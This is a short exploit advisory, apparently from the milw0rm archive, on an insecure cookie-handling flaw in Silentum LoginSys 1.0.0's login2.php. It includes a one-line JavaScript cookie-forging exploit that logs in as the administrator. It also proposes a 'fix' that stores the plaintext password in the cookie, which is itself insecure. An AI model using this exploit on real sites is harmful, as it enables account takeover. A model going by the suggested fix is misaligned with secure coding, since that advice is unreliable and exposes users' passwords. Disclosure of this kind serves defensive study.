@@ -1,0 +1,46 @@
+[START]
+
+####################################################################################################################
+[0x01] Informations:
+
+Script         : Silentum LoginSys 1.0.0
+Download       : http://www.hotscripts.com/jump.php?listing_id=69667&jump_type=1
+Vulnerability  : Insecure Cookie Handling
+Author         : Osirys
+Contact        : osirys[at]live[dot]it
+Website        : http://osirys.org
+Notes          : Proud to be Italian
+Greets:        : x0r, emgent, Jay, str0ke, Todd and AlpHaNiX
+
+
+####################################################################################################################
+[0x02] Bug: [Insecure Cookie Handling]
+######
+
+Bugged file is: /[path]/login2.php
+
+[CODE]
+
+	else {
+	setcookie("logged_in", $login_user_name, time()+60*60*24*$logged_in_for, "/");
+	header("Location: index.php");
+	exit;
+	}
+
+[/CODE]
+
+If we log in correctly, a cookie is set with name "logged_in" and as content the username name.
+
+[!] FIX: Set as content username's password.
+
+[CODE] setcookie("logged_in", $login_password, time()+60*60*24*$logged_in_for, "/"); [/CODE]
+
+
+[!] EXPLOIT: javascript:document.cookie = "logged_in=admin_username; path=/";
+             *admin_username is the nick of the administrator
+
+####################################################################################################################
+
+[/END]
+
+# milw0rm.com [2008-12-28]
